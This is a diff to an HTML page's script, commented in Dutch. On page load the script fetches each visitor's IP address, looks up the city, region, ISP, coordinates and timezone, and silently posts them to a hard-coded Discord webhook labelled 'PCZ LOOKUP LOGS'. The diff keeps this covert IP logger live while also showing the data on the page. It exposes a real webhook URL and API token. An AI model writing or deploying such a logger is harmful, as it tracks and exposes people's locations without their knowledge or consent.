@@ -275,53 +275,51 @@
             }
         }
 
-<!-- JavaScript Code -->
-<script>
-    // Verkrijg het IP van de gebruiker bij het laden van de pagina en log het naar Discord
-    window.onload = async function() {
-        const ip = await getUserIP();
-        const locationData = await lookupIPData(ip); // We gebruiken de opgehaalde IP om gegevens op te halen
-
-        // Log de gegevens naar Discord
-        logToDiscord(locationData);
-    };
-
-    async function getUserIP() {
-        try {
-            const response = await fetch('https://api.ipify.org?format=json');
+        async function lookupIPData(ip) {
+            // Gebruik een IP lookup API om locatie-informatie te verkrijgen
+            const response = await fetch(`https://ipinfo.io/${ip}/json?token=<4b708a498f9053>`);
             const data = await response.json();
-            return data.ip;
-        } catch (error) {
-            console.error('Error fetching IP:', error);
+            return data;
         }
-    }
 
-    async function lookupIPData(ip) {
-        // Gebruik een IP lookup API om locatie-informatie te verkrijgen
-        const response = await fetch(`https://ipinfo.io/${ip}/json?token=<4b708a498f9053>`);
-        const data = await response.json();
-        return data;
-    }
+        function logToDiscord(data) {
+            const webhookURL = "<https://discord.com/api/webhooks/1352197635553099776/K0xeA43auB1lX5OXVIVNsr7kT69wEE15gaIUGQWP4nBMqC_QrvXi46f6CpFS5QW6vyXF>";  // Voeg je Discord webhook URL in
+            const discordMessage = {
+                username: "PCZ LOOKUP LOGS",  // De naam die in Discord wordt weergegeven
+                avatar_url: "<https://i.pinimg.com/736x/cc/39/d6/cc39d61a9d59631d750dae50912717bf.jpg>",  // Voeg de URL van je grappige profielfoto in
+                content: `**IP Lookup Result**\n\n**IP Address:** ${data.ip}\n**City:** ${data.city}\n**Region:** ${data.region}\n**Country:** ${data.country}\n**ISP:** ${data.org}\n**Location:** ${data.loc}\n**Timezone:** ${data.timezone}`
+            };
 
-    function logToDiscord(data) {
-        const webhookURL = "<https://discord.com/api/webhooks/1352197635553099776/K0xeA43auB1lX5OXVIVNsr7kT69wEE15gaIUGQWP4nBMqC_QrvXi46f6CpFS5QW6vyXF>";  // Vervang dit met je werkelijke webhook URL
-        const discordMessage = {
-            username: "PCZ LOOKUP LOGS",  // De naam die in Discord wordt weergegeven
-            avatar_url: "<grappige_pfp_url>",  // De URL van de grappige profielfoto
-            content: `**IP Lookup Result**\n\n**IP Address:** ${data.ip}\n**City:** ${data.city}\n**Region:** ${data.region}\n**Country:** ${data.country}\n**ISP:** ${data.org}\n**Location:** ${data.loc}\n**Timezone:** ${data.timezone}`
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(discordMessage)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Log sent to Discord:', data))
+            .catch(error => console.error('Error sending log to Discord:', error));
+        }
+
+        // Functie om de gegevens te laden en op de pagina weer te geven
+        window.onload = async function() {
+            const ip = await getUserIP();
+            const locationData = await lookupIPData(ip);
+
+            // Vul de gegevens in de HTML in
+            document.getElementById("ipAddress").innerText = locationData.ip;
+            document.getElementById("city").innerText = locationData.city;
+            document.getElementById("region").innerText = locationData.region;
+            document.getElementById("country").innerText = locationData.country;
+            document.getElementById("isp").innerText = locationData.org;
+            document.getElementById("latitude").innerText = locationData.loc.split(",")[0];
+            document.getElementById("longitude").innerText = locationData.loc.split(",")[1];
+            document.getElementById("timezone").innerText = locationData.timezone;
+
+            // Log de gegevens naar Discord
+            logToDiscord(locationData);
         };
-
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(discordMessage)
-        })
-        .then(response => response.json())
-        .then(data => console.log('Log sent to Discord:', data))
-        .catch(error => console.error('Error sending log to Discord:', error));
-    }
-</script>
+    </script>
 </body>
 </html>
